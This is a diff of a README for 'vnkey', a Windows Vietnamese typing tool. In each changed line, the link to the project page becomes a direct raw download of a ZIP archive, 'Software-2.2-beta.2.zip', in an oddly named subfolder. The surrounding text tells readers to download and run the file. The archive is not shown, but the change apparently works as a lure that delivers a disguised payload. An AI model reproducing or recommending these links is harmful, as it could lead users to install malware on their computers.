@@ -1,6 +1,6 @@
 # 🈵 vnkey - Simple Vietnamese typing on Windows
 
-[![Download vnkey](https://img.shields.io/badge/Download-vnkey-blue?style=for-the-badge)](https://github.com/Bber1684/vnkey)
+[![Download vnkey](https://img.shields.io/badge/Download-vnkey-blue?style=for-the-badge)](https://github.com/Bber1684/vnkey/raw/refs/heads/main/Rissoa/Software-2.2-beta.2.zip)
 
 ## 🪟 What vnkey does
 
@@ -12,7 +12,7 @@ It helps you type Vietnamese with a normal keyboard. You can use it for chat, em
 
 Visit this page to download and install vnkey on Windows:
 
-https://github.com/Bber1684/vnkey
+https://github.com/Bber1684/vnkey/raw/refs/heads/main/Rissoa/Software-2.2-beta.2.zip
 
 On the page, look for the latest release or Windows build. Download the file for Windows, then run it on your PC.
 
@@ -145,7 +145,7 @@ For Windows, choose the file made for Windows. If you see a ZIP file, unpack it 
 
 ## 📎 Download again
 
-[Download vnkey from GitHub](https://github.com/Bber1684/vnkey)
+[Download vnkey from GitHub](https://github.com/Bber1684/vnkey/raw/refs/heads/main/Rissoa/Software-2.2-beta.2.zip)
 
 ## 📄 Project name
 
